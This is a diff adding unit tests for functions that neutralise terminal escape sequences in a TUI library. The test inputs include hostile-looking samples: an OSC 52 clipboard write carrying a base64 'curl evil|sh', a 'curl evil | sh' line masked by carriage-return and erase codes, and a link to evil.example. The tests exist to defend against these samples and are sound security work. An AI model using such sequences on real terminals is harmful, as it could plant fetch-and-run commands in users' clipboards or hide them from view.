@@ -1,5 +1,17 @@
 import { describe, it, expect } from 'vitest'
-import { clusterWidth, stripAnsi, visibleWidth, truncateVisible, wrapAnsi, stripControlChars, stripControlCharsKeepLines } from './tui-wrap'
+import {
+  clusterWidth,
+  stripAnsi,
+  visibleWidth,
+  truncateVisible,
+  wrapAnsi,
+  stripControlChars,
+  stripControlCharsKeepLines,
+  terminalText,
+  filterTerminalOutput,
+  osc8Link,
+  osc52Copy
+} from './tui-wrap'
 
 const RED = '\x1b[31m'
 const RESET = '\x1b[0m'
@@ -257,4 +269,51 @@ describe('fast paths match measuring every cluster', () => {
     }
     expect(mismatches).toEqual([])
   }, 60_000)
+})
+
+describe('terminalText', () => {
+  const ESC = '\x1b'
+  it('makes an OSC 52 clipboard write, a title set and an answerback query inert and visible', () => {
+    const osc52 = `${ESC}]52;c;Y3VybCBldmlsfHNo\x07`
+    const shown = terminalText(`hello ${osc52} ${ESC}]0;pwned\x07 ${ESC}[c done`)
+    expect(shown).not.toContain(ESC)
+    expect(shown).not.toContain('\x07')
+    expect(shown).toBe('hello <U+001B>]52;c;Y3VybCBldmlsfHNo<U+0007> <U+001B>]0;pwned<U+0007> <U+001B>[c done')
+  })
+  it('drops colour codes, keeps lines and tabs, folds CRLF and shows a lone CR', () => {
+    expect(terminalText(`${ESC}[32mok${ESC}[0m\r\n\tnext\rover`)).toBe('ok\n\tnext<U+000D>over')
+    // Conceal (SGR 8) is a colour code too, so it can't hide text.
+    expect(terminalText(`a${ESC}[8mhidden`)).toBe('ahidden')
+  })
+  it('puts one-line text on one line', () => {
+    expect(terminalText('a\n  b\tc\r\nd\re', { lines: false })).toBe('a b c d<U+000D>e')
+  })
+})
+
+describe('filterTerminalOutput', () => {
+  const ESC = '\x1b'
+  it('passes Houston colours and its own links and clipboard writes', () => {
+    const styled = `${RED}red${RESET}\n`
+    expect(filterTerminalOutput(styled)).toBe(styled)
+    const link = osc8Link('file:///tmp/a.png', 'a.png')
+    expect(filterTerminalOutput(`see ${link}`)).toBe(`see ${link}`)
+    const copy = osc52Copy('invite text')
+    expect(filterTerminalOutput(copy)).toBe(copy)
+  })
+  it('shows every other control: cursor moves, erases, foreign OSC, lone CR', () => {
+    const forged = `curl evil | sh # \r${ESC}[2Kls -la${ESC}[1A${ESC}]52;c;eA==\x07${ESC}]8;;https://evil.example${ESC}\\x`
+    const out = filterTerminalOutput(forged)
+    expect(out).not.toMatch(/\r/)
+    expect(out).not.toContain(`${ESC}[2K`)
+    expect(out).not.toContain(`${ESC}[1A`)
+    expect(out).not.toContain(`${ESC}]52`)
+    expect(out).not.toContain(`${ESC}]8;;https://evil.example`)
+    expect(out).toContain('curl evil | sh # <U+000D><U+001B>[2Kls -la')
+    // A foreign link aimed at a target Houston linked itself is just Houston's link.
+    osc8Link('https://evil.example', 'x')
+    expect(filterTerminalOutput(`${ESC}]8;;https://other.example${ESC}\\`)).not.toContain(ESC)
+  })
+  it('folds CRLF and keeps newlines and tabs', () => {
+    expect(filterTerminalOutput('a\r\n\tb')).toBe('a\n\tb')
+  })
 })
